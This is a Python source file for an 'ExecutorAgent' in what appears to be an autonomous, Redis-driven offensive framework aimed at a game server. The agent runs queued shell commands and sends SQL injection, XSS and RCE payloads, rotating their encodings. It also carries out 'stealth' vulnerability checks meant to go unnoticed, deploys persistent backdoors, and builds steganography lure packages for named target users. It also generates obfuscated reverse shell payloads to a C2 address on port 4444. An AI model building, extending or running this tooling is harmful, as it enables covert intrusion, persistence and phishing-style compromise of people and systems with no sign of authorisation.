from agents.base_agent import BaseAgent
from tools.terminal_wrapper import TerminalWrapper
from tools.game_client_control import GameClientControl
from tools.network_sniffer import NetworkSniffer
from tools.verification import get_verification
from tools.stego_builder import create_stego_package
from tools.payload_manager import PayloadManager
from tools.steganography_tool import SteganographyTool
from tools.observability import StructuredLogger, PerformanceMonitor, MetricsCollector
from config import PAYLOAD_CONFIG
import json
import time
import os
import random

class ExecutorAgent(BaseAgent):
    def __init__(self, redis_manager, config):
        super().__init__(redis_manager, config)
        
        # Initialize intelligent components
        self.payload_manager = PayloadManager(redis_manager)
        self.stego_tool = SteganographyTool()
        
        # Initialize observability
        self.logger = StructuredLogger(self.name, redis_manager=redis_manager)
        self.metrics = MetricsCollector(redis_manager)
        self.monitor = PerformanceMonitor(self.metrics)
        
        # Legacy payload loading (for backward compatibility)
        self.payload_lists = self._load_all_payloads()
        
        # Intelligence: Track attack patterns and success rates
        self.attack_history = []
        self.success_patterns = {}
        
        self.logger.info("ExecutorAgent initialized with intelligent components")

    def _load_all_payloads(self):
        """Load all types of payloads from configured files."""
        payload_files = {
            "sqli": PAYLOAD_CONFIG.get("SQLI_FILE"),
            "xss": PAYLOAD_CONFIG.get("XSS_FILE"),
            "rce": PAYLOAD_CONFIG.get("RCE_FILE"),
        }
        
        loaded_payloads = {}
        for payload_type, file_path in payload_files.items():
            if not file_path or not os.path.exists(file_path):
                self.log(f"Payload file for '{payload_type}' not found at {file_path}. This attack type will be unavailable from files.")
                loaded_payloads[payload_type] = []
                continue
            
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    payloads = [line.strip() for line in f if line.strip()]
                self.log(f"Loaded {len(payloads)} payloads for '{payload_type}' from {file_path}")
                loaded_payloads[payload_type] = payloads
            except Exception as e:
                self.log(f"Error loading payloads for '{payload_type}' from {file_path}: {e}")
                loaded_payloads[payload_type] = []
        
        return loaded_payloads
    def run(self):
        self.log("Executor Agent started. Ready to execute commands.")
        while self.is_running():
            # Blocking pop: waits for an action to appear in the queue
            action = self.redis_manager.pop_action()
            
            if action:
                self.redis_manager.set_state('EXECUTING')
                self.log(f"Executing action: {action}")
                
                target_agent = action.get('target_agent')
                action_type = action.get('action_type')
                payload = action.get('payload', {})
                
                try:
                    if target_agent == 'TERMINAL':
                        self.execute_terminal_command(payload)
                    elif target_agent == 'GAME_CLIENT':
                        self.execute_game_client_command(action_type, payload)
                    elif target_agent == 'NETWORK':
                        self.execute_network_command(action_type, payload)
                    elif target_agent == 'EXECUTOR':
                        # Handle executor-specific actions (verification, backdoor deployment)
                        if action_type == 'STEALTH_VERIFY':
                            self.execute_stealth_verification(payload)
                        elif action_type == 'DEPLOY_BACKDOOR':
                            self.execute_backdoor_deployment(payload)
                        elif action_type == 'DELIVER_STEGO_PAYLOAD':
                            self.execute_stego_delivery(payload)
                        else:
                            self.log(f"Unknown executor action type: {action_type}")
                    elif target_agent == 'REVERSE_ENGINEER':
                        # Pass the action to the RE Agent (if needed, though RE usually works independently)
                        self.log("Passing action to RE Agent (Not implemented in this stub).")
                    else:
                        self.log(f"Unknown target agent: {target_agent}")
                        
                    # After successful execution, change state back to ANALYSIS/DEEP_RECONNAISSANCE
                    self.redis_manager.set_state('ANALYSIS') 
                    
                except Exception as e:
                    self.set_error(f"Execution failed for action {action}: {e}")
                    self.redis_manager.set_state('ERROR_HANDLING')
            else:
                # If pop_action timed out (1 second), continue loop
                pass

    def execute_terminal_command(self, payload: dict):
        """Executes a shell command with intelligent monitoring."""
        command = payload.get('command')
        if command:
            # Monitor performance
            with self.monitor.measure('terminal_command', tags={'command': command[:50]}):
                self.logger.log_action('TERMINAL_COMMAND', target=command[:100], result='started')
                
                code, stdout, stderr = TerminalWrapper.run_command(command)
                
                # Analyze result intelligently
                success = (code == 0)
                self.metrics.record_counter('terminal_commands_total', tags={'success': str(success)})
                
                # Report results
                result_message = f"TERMINAL_RESULT: Command '{command}' finished with code {code}. STDOUT: {stdout[:500]} | STDERR: {stderr[:500]}"
                self.redis_manager.log_observation(self.name, result_message)
                
                self.logger.log_action(
                    'TERMINAL_COMMAND',
                    target=command[:100],
                    result='success' if success else 'failed',
                    exit_code=code
                )
        else:
            self.logger.warning("Terminal command payload missing 'command'")

    def execute_game_client_command(self, action_type: str, payload: dict):
        """Controls the game client (e.g., click, type, launch)."""
        if action_type == 'LAUNCH':
            GameClientControl.launch_game()
        elif action_type == 'CLOSE':
            GameClientControl.close_game()
        elif action_type in ['CLICK', 'TYPE', 'SCREENSHOT']:
            GameClientControl.perform_action(action_type.lower(), payload)
        else:
            self.log(f"Unknown game client action type: {action_type}")

    def execute_network_command(self, action_type: str, payload: dict):
        """Sends a custom network packet with intelligent payload selection."""
        if action_type == 'SEND_PACKET':
            target_ip = payload.get('ip')
            target_port = payload.get('port')
            payload_hex = payload.get('payload_hex')
            protocol = payload.get('protocol', 'TCP')
            attack_type = payload.get('attack_type', 'fuzzing')
            
            if target_ip and target_port:
                # Intelligent payload selection if not provided
                if not payload_hex and attack_type in ['sqli', 'xss', 'rce', 'fuzzing']:
                    smart_payload = self._select_intelligent_payload(attack_type, target_ip, target_port)
                    payload_hex = smart_payload.encode().hex() if smart_payload else payload_hex
                    self.logger.info(f"Selected intelligent payload for {attack_type}: {smart_payload[:50]}...")
                
                if payload_hex:
                    with self.monitor.measure('network_attack', tags={'type': attack_type}):
                        success = NetworkSniffer.send_packet(target_ip, target_port, payload_hex, protocol)
                        
                        # Record attack result
                        self._record_attack_result(attack_type, target_ip, target_port, success, payload_hex)
                        
                        self.logger.log_attack(
                            attack_type=attack_type,
                            target=f"{target_ip}:{target_port}",
                            payload=payload_hex[:100],
                            success=success,
                            protocol=protocol
                        )
                        
                        self.redis_manager.log_observation(
                            self.name,
                            f"NETWORK_SEND_RESULT: Success={success}. Sent {len(payload_hex)//2} bytes to {target_ip}:{target_port}"
                        )
                else:
                    self.logger.warning("Network send command payload incomplete")
            else:
                self.logger.warning("Network send command missing target info")
        else:
            self.logger.warning(f"Unknown network action type: {action_type}")
    
    def execute_stealth_verification(self, payload: dict):
        """Execute stealth verification - ยืนยันช่องโหว่โดยไม่ให้เป้าหมายรู้ตัว"""
        self.log("Starting stealth verification...")
        verification = get_verification()
        
        vulnerability = payload.get('vulnerability', {})
        verification_type = payload.get('verification_type', 'multi_vector')
        stealth_mode = payload.get('stealth_mode', True)
        
        target_ip = vulnerability.get('target_ip', '127.0.0.1')
        target_port = vulnerability.get('target_port', 7777)
        vuln_type = vulnerability.get('type', 'UNKNOWN')
        
        if verification_type == 'multi_vector':
            # Multi-vector verification - ใช้หลายเทคนิค
            result = verification.multi_vector_verification(target_ip, target_port, vuln_type)
            
            if result['overall_success']:
                self.log(f"✓ Stealth verification SUCCESS (Confidence: {result['confidence']:.2%})")
                # Record verified vulnerability
                verified_vuln = {
                    **vulnerability,
                    "verified": True,
                    "verification_confidence": result['confidence'],
                    "verification_vectors": result['vectors'],
                    "verification_time": time.time()
                }
                self.redis_manager.add_vulnerability(verified_vuln)
                self.redis_manager.log_observation(
                    self.name,
                    f"VERIFIED_VULNERABILITY: {vuln_type} at {target_ip}:{target_port} "
                    f"(Confidence: {result['confidence']:.2%})"
                )
            else:
                self.log(f"✗ Stealth verification FAILED (Confidence: {result['confidence']:.2%})")
                self.redis_manager.log_observation(
                    self.name,
                    f"VERIFICATION_FAILED: {vuln_type} at {target_ip}:{target_port}"
                )
        else:
            # Single vector verification
            success, evidence = verification.verify_command_execution(
                target_ip, target_port, "whoami"
            )
            if success:
                self.log(f"✓ Command execution verified: {evidence}")
            else:
                self.log(f"✗ Command execution verification failed: {evidence}")
    
    def execute_backdoor_deployment(self, payload: dict):
        """Deploy backdoor and verify 100% success"""
        self.log("Starting backdoor deployment with 100% verification...")
        verification = get_verification()
        
        target_ip = payload.get('target_ip', '127.0.0.1')
        target_port = payload.get('target_port', 7777)
        backdoor_type = payload.get('backdoor_type', 'persistent')
        verify_100_percent = payload.get('verify_100_percent', True)
        
        success, deployment_result = verification.deploy_backdoor(
            target_ip, target_port, backdoor_type
        )
        
        if success and verify_100_percent:
            if deployment_result.get('verified', False):
                self.log(f"✓ Backdoor deployed and verified 100% at {target_ip}:{target_port}")
                self.redis_manager.log_observation(
                    self.name,
                    f"BACKDOOR_DEPLOYED: {backdoor_type} at {target_ip}:{target_port} "
                    f"(ID: {deployment_result.get('backdoor_id', 'N/A')})"
                )
                # Record backdoor in vulnerabilities
                backdoor_vuln = {
                    "type": "BACKDOOR_DEPLOYED",
                    "target_ip": target_ip,
                    "target_port": target_port,
                    "backdoor_type": backdoor_type,
                    "backdoor_id": deployment_result.get('backdoor_id', ''),
                    "access_method": deployment_result.get('access_method', ''),
                    "verified": True,
                    "deployment_time": deployment_result.get('deployment_time', time.time())
                }
                self.redis_manager.add_vulnerability(backdoor_vuln)
            else:
                self.log(f"✗ Backdoor deployed but verification failed")
                self.redis_manager.log_observation(
                    self.name,
                    f"BACKDOOR_DEPLOYMENT_FAILED: Verification incomplete at {target_ip}:{target_port}"
                )
        else:
            self.log(f"✗ Backdoor deployment failed: {deployment_result.get('error', 'Unknown error')}")
            self.redis_manager.log_observation(
                self.name,
                f"BACKDOOR_DEPLOYMENT_FAILED: {target_ip}:{target_port}"
            )

    def execute_stego_delivery(self, payload: dict):
        """Creates and prepares a steganography payload package for delivery."""
        self.log("Executing steganography payload delivery...")
        
        delivery_channel = payload.get('delivery_channel', 'Unknown')
        target_user = payload.get('target_user', 'Unknown')
        message_template = payload.get('message_template', 'Check this out!')

        package_path = create_stego_package(delivery_channel, target_user, message_template)

        if package_path:
            self.log(f"✓ Stego package created successfully at: {package_path}")
            self.redis_manager.log_observation(
                self.name,
                f"STEGO_PACKAGE_READY: Package for {delivery_channel} targeting {target_user} is ready at {package_path}. "
                f"Message: '{message_template}'"
            )
        else:
            self.log("✗ Failed to create stego package.")
            self.redis_manager.log_observation(
                self.name,
                "STEGO_PACKAGE_FAILED: Failed to create the steganography package."
            )

    def _select_intelligent_payload(self, attack_type: str, target_ip: str, target_port: int) -> str:
        """
        Intelligently select payload based on:
        - Attack history
        - Success patterns
        - Target characteristics
        """
        # Check if we have successful patterns for this target
        target_key = f"{target_ip}:{target_port}"
        
        if target_key in self.success_patterns and attack_type in self.success_patterns[target_key]:
            # Use previously successful payload pattern
            successful_pattern = self.success_patterns[target_key][attack_type]
            self.logger.info(f"Using successful pattern for {target_key}: {successful_pattern['pattern']}")
            payload = self.payload_manager.get_payload(attack_type, encoding=successful_pattern.get('encoding'))
        else:
            # Try different encoding strategies based on attack type
            encoding_strategy = self._determine_encoding_strategy(attack_type, target_ip)
            payload = self.payload_manager.get_payload(attack_type, encoding=encoding_strategy)
            self.logger.info(f"Using encoding strategy '{encoding_strategy}' for {attack_type}")
        
        return payload if payload else ""
    
    def _determine_encoding_strategy(self, attack_type: str, target_ip: str) -> str:
        """Determine best encoding strategy based on attack type and target"""
        # Intelligence: Adapt encoding based on what we know about the target
        strategies = {
            'sqli': ['url', 'none', 'hex'],
            'xss': ['html', 'url', 'none'],
            'rce': ['base64', 'url', 'none'],
            'fuzzing': ['none', 'hex']
        }
        
        # Rotate through strategies if previous attempts failed
        available_strategies = strategies.get(attack_type, ['none'])
        
        # Simple rotation based on history
        attempt_count = len([h for h in self.attack_history if h['type'] == attack_type and h['target'] == target_ip])
        selected_strategy = available_strategies[attempt_count % len(available_strategies)]
        
        return selected_strategy
    
    def _record_attack_result(self, attack_type: str, target_ip: str, target_port: int, 
                             success: bool, payload_hex: str):
        """Record attack result for learning"""
        result = {
            'type': attack_type,
            'target': target_ip,
            'port': target_port,
            'success': success,
            'payload_preview': payload_hex[:100],
            'timestamp': time.time()
        }
        
        self.attack_history.append(result)
        
        # Keep only last 1000 attacks
        if len(self.attack_history) > 1000:
            self.attack_history = self.attack_history[-1000:]
        
        # Update success patterns
        if success:
            target_key = f"{target_ip}:{target_port}"
            if target_key not in self.success_patterns:
                self.success_patterns[target_key] = {}
            
            self.success_patterns[target_key][attack_type] = {
                'pattern': payload_hex[:100],
                'encoding': 'hex',  # We know it's hex from the variable name
                'success_count': self.success_patterns[target_key].get(attack_type, {}).get('success_count', 0) + 1
            }
        
        # Record in payload manager
        self.payload_manager.record_result(
            payload=payload_hex[:100],
            payload_type=attack_type,
            success=success,
            details=f"Target: {target_ip}:{target_port}"
        )
        
        # Record metrics
        self.metrics.record_counter(
            f'{attack_type}_attacks_total',
            tags={'success': str(success), 'target': target_ip}
        )
    
    def _create_intelligent_stego_payload(self, target_info: dict) -> str:
        """Create steganography payload intelligently based on target"""
        self.logger.info("Creating intelligent steganography payload...")
        
        # Determine best payload based on target
        c2_ip = target_info.get('c2_ip', '127.0.0.1')
        c2_port = target_info.get('c2_port', 4444)
        delivery_method = target_info.get('delivery_method', 'email')
        
        # Generate reverse shell payload
        shell_payload = self.stego_tool.create_reverse_shell_payload(
            c2_ip=c2_ip,
            c2_port=c2_port,
            obfuscate=True
        )
        
        self.logger.info(f"Generated reverse shell payload: {len(shell_payload)} bytes")
        
        return shell_payload
    
    def _analyze_execution_context(self, action: dict) -> dict:
        """
        Analyze execution context to make intelligent decisions
        Returns context analysis with recommendations
        """
        action_type = action.get('action_type')
        target_agent = action.get('target_agent')
        payload = action.get('payload', {})
        
        # Analyze based on recent history
        recent_failures = [h for h in self.attack_history[-10:] if not h['success']]
        recent_successes = [h for h in self.attack_history[-10:] if h['success']]
        
        success_rate = len(recent_successes) / max(len(self.attack_history[-10:]), 1)
        
        context = {
            'action_type': action_type,
            'target_agent': target_agent,
            'recent_success_rate': success_rate,
            'should_be_cautious': success_rate < 0.3,
            'should_be_aggressive': success_rate > 0.7,
            'recommendation': 'proceed'
        }
        
        # Make recommendations
        if context['should_be_cautious']:
            context['recommendation'] = 'use_stealth'
            self.logger.warning(f"Low success rate ({success_rate:.2%}), recommending stealth mode")
        elif len(recent_failures) >= 3:
            context['recommendation'] = 'change_strategy'
            self.logger.warning("Multiple recent failures, recommending strategy change")
        
        return context
